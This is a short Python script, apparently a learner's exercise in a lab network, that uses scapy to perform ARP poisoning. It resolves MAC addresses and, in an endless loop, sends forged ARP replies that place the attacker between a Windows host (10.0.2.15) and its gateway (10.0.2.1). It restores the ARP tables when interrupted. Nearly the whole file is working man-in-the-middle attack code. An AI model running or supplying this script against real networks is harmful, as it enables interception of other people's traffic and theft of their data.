import scapy.all as scapy
import time #to not crash the device when we put the code in the while loop

def get_mac_adress(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    #print (answered_list[0][1].hwsrc) with using verbose we stopped it to get output constantly, so we can use this as a command line now
    #print(list(answered_list[0][1].hwsrc)) this listed version shows every attribute
    return answered_list[0][1].hwsrc #this is it with return but it doesnt print it


def arp_poisoning(target_ip, poisoned_ip):

    target_mac = get_mac_adress(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False) #this is the line where it sends packets all the time, to stop it we use verbose = False
    #scapy.ls(scapy.ARP())

def reset_operation(fooled_ip, gateway_ip): #this part is to stop the MITM when we stop the code

    fooled_mac = get_mac_adress(fooled_ip)
    gateway_mac = get_mac_adress(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)#the reason we say count is to identify how many times we will send this
number = 0

try: #to not get a keyboard error error when we do ctrl+c
    while True:

        arp_poisoning("10.0.2.15","10.0.2.1") #this fools the windows machine , we seem like the router
        arp_poisoning("10.0.2.1","10.0.2.15") #this fools the router , we seem like the target device(windows here)

        number += 2

        print("\rSending packets " + str(number),end="") #means stay in the same line, end="" at the end means don't add anything to its end

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation("10.0.2.15","10.0.2.1")
    reset_operation("10.0.2.1","10.0.2.15")




#yazdığımız kod ip adresini girdiğimiz cihazın mac ini almamızı sağlıyor
#scan_my_network("10.0.2.15")




#import scapy.all as scapy
#arp_response = scapy.ARP(op=2,pdst="10.0.2.15",hwdst="08:00:27:e6:e5:59",psrc="10.0.2.1")
#scapy.send(arp_response)
#scapy.ls(scapy.ARP()) bu orjinali idi, şimdi otomatize yapıcaz